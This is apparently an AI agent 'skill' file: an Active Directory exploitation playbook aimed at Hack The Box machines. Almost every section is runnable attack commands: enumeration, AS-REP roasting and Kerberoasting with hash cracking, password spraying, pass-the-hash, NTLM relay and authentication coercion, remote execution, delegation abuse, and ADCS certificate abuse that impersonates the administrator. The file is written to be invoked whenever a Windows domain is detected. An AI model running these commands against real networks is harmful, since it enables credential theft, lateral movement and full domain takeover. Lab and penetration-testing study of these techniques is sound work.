# Skill: Active Directory Exploitation

> **Domain:** Active Directory  
> **Difficulty:** Hard to Insane  
> **Prerequisites:** Windows networking, Kerberos, LDAP, BloodHound  
> **Invoke Condition:** Windows domain environment detected

---

## 1. Philosophy

> *"Active Directory is not a target — it's a graph. Your job is to find the shortest path from your current node to Domain Admin."*

---

## 2. Enumeration

### 2.1 BloodHound Data Collection
```powershell
# SharpHound (from target)
.\SharpHound.exe -c All

# bloodhound-python (from Linux)
bloodhound-python -u <user> -p <pass> -ns <dc_ip> -d <domain>.local -c all

# Upload to BloodHound GUI and analyze
```

### 2.2 Basic AD Enumeration
```powershell
# Domain info
net view /domain
net view /domain:<domain>

# User enumeration
net user /domain
net user <username> /domain

# Group enumeration
net group /domain
net group "Domain Admins" /domain

# Domain Controllers
nltest /dclist:<domain>

# LDAP queries
ldapsearch -x -H ldap://<dc_ip> -b "dc=<domain>,dc=local" "(objectClass=user)"
```

### 2.3 netexec (Modern Replacement for CrackMapExec)
```bash
# SMB enumeration
netexec smb <dc_ip>
netexec smb <dc_ip> -u <user> -p <pass> --shares
netexec smb <dc_ip> -u <user> -p <pass> --users
netexec smb <dc_ip> -u <user> -p <pass> --groups

# Check for password policy
netexec smb <dc_ip> -u <user> -p <pass> --pass-pol

# Check for AS-REP Roasting
netexec ldap <dc_ip> -u <user> -p <pass> --asreproast

# Check for Kerberoasting
netexec ldap <dc_ip> -u <user> -p <pass> --kerberoasting
```

---

## 3. Credential Attacks

### 3.1 AS-REP Roasting
```bash
# Find accounts with "Do not require Kerberos preauthentication"
GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat

# Crack with hashcat
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3.2 Kerberoasting
```bash
# Request service tickets
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3.3 Password Spraying
```bash
# Spray passwords (be careful with lockout policy!)
netexec smb <dc_ip> -u users.txt -p 'Password123' --continue-on-success
netexec smb <dc_ip> -u users.txt -p passwords.txt --no-bruteforce
```

### 3.4 Pass-the-Hash
```bash
# Use NTLM hash directly
netexec smb <dc_ip> -u <user> -H <ntlm_hash>
psexec.py <domain>/<user>@<dc_ip> -hashes <lm_hash>:<ntlm_hash>
```

---

## 4. Lateral Movement

### 4.1 NTLM Relay
```bash
# Set up responder
responder -I tun0 -wrf

# Relay with ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -i

# Coerce authentication
petitpotam.py <listener_ip> <target_ip>
printerbug.py <domain>/<user>:<pass>@<target_ip> <listener_ip>
```

### 4.2 WMIExec / SMBExec
```bash
# Execute commands remotely
wmiexec.py <domain>/<user>:<pass>@<target_ip>
smbexec.py <domain>/<user>:<pass>@<target_ip>
```

### 4.3 PsExec
```bash
# Upload and execute service
psexec.py <domain>/<user>:<pass>@<target_ip>
```

---

## 5. Delegation Attacks

### 5.1 Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# If you compromise such a computer, export all tickets
# Use Rubeus to harvest tickets
.\Rubeus.exe harvest /interval:30
```

### 5.2 Constrained Delegation
```bash
# Find accounts with constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"}

# Abuse with Impacket
getST.py <domain>/<service_account> -spn <target_spn> -impersonate <target_user>
```

### 5.3 Resource-Based Constrained Delegation (RBCD)
```bash
# Check if you have GenericWrite on a computer object
# If yes, set RBCD to your controlled account
rbcd.py -delegate-from <attacker_account$> -delegate-to <target_computer$> <domain>/<user>:<pass>
```

---

## 6. ADCS (Active Directory Certificate Services)

### 6.1 ESC1 - Web Enrollment + No Approval
```bash
# Find vulnerable certificate templates
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip>

# Request certificate for any user
certipy req -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -ca <ca_name> -template <template_name> -upn administrator@<domain>

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 6.2 ESC8 - NTLM Relay to ADCS Web Enrollment
```bash
# Relay NTLM authentication to ADCS web enrollment
ntlmrelayx.py -t http://<adcs_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### 6.3 ESC13 - OID Group Link
```bash
# Check for certificates with OID linking to groups
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable

# Request and use for group membership
```

---

## 7. Cross-Forest Attacks

### 7.1 Trust Enumeration
```powershell
# List domain trusts
nltest /domain_trusts
Get-ADTrust -Filter *

# Check for SIDHistory or foreign group membership
```

### 7.2 Trust Abuse
```bash
# If bidirectional trust exists, abuse it
# Use Rubeus to forge inter-realm TGT
```

---

## 8. Assume Breach Scenarios (2026 Trend)

Many 2026 HTB boxes start with domain credentials:

| Box | Starting Point | Path |
|-----|---------------|------|
| HTB: DarkZero | Domain user | MSSQL -> Linked Server -> Admin |
| HTB: Signed | Domain user | MSSQL -> xp_cmdshell -> Admin |
| HTB: Eighteen | Domain user | dMSA -> Bad Successor -> Admin |
| HTB: Mist | Domain user | ADCS ESC13 -> Admin |

---

## 9. Validation Checklist

```
□ BloodHound data collected and analyzed
□ All attack paths from current node identified
□ Kerberoastable/AS-REP roastable accounts found
□ Delegation settings enumerated
□ ADCS templates checked for vulnerabilities
□ Trust relationships mapped
□ Lateral movement tested with benign commands
□ Domain Admin achieved and validated
```

---

*"In Active Directory, you're not hacking a computer — you're navigating a graph of trust relationships."*
